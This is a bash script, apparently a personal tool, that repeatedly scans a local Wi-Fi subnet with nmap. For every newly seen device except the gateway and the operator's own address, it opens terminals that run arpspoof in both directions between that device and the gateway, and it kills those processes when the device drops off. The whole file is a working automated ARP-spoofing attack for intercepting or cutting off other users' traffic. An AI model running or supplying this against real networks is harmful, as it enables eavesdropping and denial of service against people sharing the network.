#~/bin/bash
declare -a ar
for i in `seq 1 255`
do
    ar[i]=0
done
output=/root/shell/damn/damn.txt
greper=/root/shell/greper.txt
grep2=/root/shell/grep2.txt
records=/root/shell/records
recordx=/root/shell/recordx
while true
do
> $output
> $greper
nmap -sP 192.168.43.0/24 >> $output
saying=$(cat $output)
echo xxx $saying
echo '\n'
cd /root/shell/damn
grep -rn "192.168.43." | grep -v "192.168.43.87)" | grep -v "192.168.43.0)" | grep -v "192.168.43.1)">> $greper
grape=$(cat $greper)
echo ready
echo *** $grape
echo '\n'
for i in `seq 2 255`
do
	str="192.168.43.${i}"
    > $grep2
    cd /root/shell
    grep $str greper.txt >> $grep2
    grep2s=$(cat $grep2)
    if [ -n "$grep2s" ]; then
        if [ ${ar[i]} == 0 ]; then
            echo "boom" $str
            echo '\n'
            ar[i]=1
            chmod a+x $records${i}
            > $records${i}
            echo "arpspoof -i wlan0 -t 192.168.43.1 ${str}" >> $records${i}
            gnome-terminal -t "arp down ${str}" -- $records${i}
            chmod a+x $recordx${i}
            > $recordx${i}
            echo "arpspoof -i wlan0 -t ${str} 192.168.43.1" >> $recordx${i}
            gnome-terminal -t "arp up ${str}" -- $recordx${i}
        else
            echo "already1" $str
            echo '\n'
        fi
    else
        if [ ${ar[i]} == 1 ]; then
            ar[i]=0
            echo "calm down" $str
            echo '\n'
            kill -s KILL $(ps au | grep $str | grep arpspoof | awk '{print $2}')
        fi
    fi
done
done
